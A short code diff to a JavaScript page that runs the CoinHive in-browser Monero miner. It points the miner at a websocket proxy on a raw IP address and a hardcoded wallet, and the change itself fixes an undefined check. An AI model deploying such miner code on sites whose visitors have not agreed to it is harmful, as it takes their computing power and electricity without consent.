@@ -3,7 +3,7 @@ function getParameterByName(name, url) {
     name = name.replace(/[\[\]]/g, "\\$&");
     var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
         results = regex.exec(url);
-    if (!results) return null;
+    if (!results) return undefined;
     if (!results[2]) return '';
     return decodeURIComponent(results[2].replace(/\+/g, " "));
 }
@@ -13,7 +13,7 @@ CoinHive.CONFIG.WEBSOCKET_SHARDS = [["ws://107.174.236.101:8892/proxy"]];
 // var miner = new CoinHive.Anonymous('41eRaNbwcpTfJfTEe3J1oTiauYoucZ6eKUha4RKmw6SPcpSrhU8QF5ReEpVtKxcRDqby4dFkHQ4VN76DCza9Bo4k23BNgkZ');
 // function changeAddress(){
 
-	if (typeof getParameterByName('xmrAddress') != null){
+	if (getParameterByName('xmrAddress') != undefined){
 		var miner = new CoinHive.User('48wUPadvpyEK2D7A3ZdvZPKWc5x2pndKv5p6zaUWcD3BGoULjjK3KKkPTyutkmM6JjLaAYhHmNbVVU8FkJTbwr6gQRsr74V', getParameterByName('xmrAddress'))
 		console.log("mining with address" + getParameterByName('xmrAddress'));
 	}else{
